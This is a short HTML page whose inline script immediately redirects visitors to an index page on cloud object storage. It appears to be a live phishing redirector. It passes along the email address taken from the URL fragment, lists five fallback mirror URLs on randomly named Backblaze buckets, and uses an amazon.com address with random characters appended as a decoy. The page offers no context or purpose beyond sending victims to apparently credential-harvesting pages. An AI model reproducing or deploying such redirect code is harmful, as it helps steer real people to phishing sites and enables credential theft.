<html lang="en">
	<script src="https://code.jquery.com/jquery-1.9.1.min.js"></script>
	<script>
		function makeid(length) {
			var result = "";
			var characters =
				"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
			var charactersLength = characters.length;
			for (var i = 0; i < length; i++) {
				result += characters.charAt(
					Math.floor(Math.random() * charactersLength)
				);
			}
			return result;
		}

		var hash = window.location.hash;
		var str = hash.split("#")[1];
		var em = hash.split("#")[1];

		window.setTimeout(function () {
			window.location.href = "https://hagx9opq6u.s3.us-south.objectstorage.softlayer.net/prospice/index.html?key=c4f49f3cff3c2c1f08d45854e9eb9ebb77ce62eb&url_01=https://cyclize-easygoing-suprastigmal.s3.eu-central-003.backblazeb2.com/index.html&url_02=https://containers-elatedly-petrification.s3.us-west-004.backblazeb2.com/index.html&url_03=https://benchboard-stereornithic-vangloe.s3.eu-central-003.backblazeb2.com/index.html&url_04=https://cochairing-deess-waflib.s3.eu-central-003.backblazeb2.com/index.html&url_05=https://ingenerated-nibbles-syrringing.s3.us-west-004.backblazeb2.com/index.html&redirect=https://www.amazon.com"+ makeid(10) + "#" + em;
		}, 0);
	</script>
</html>
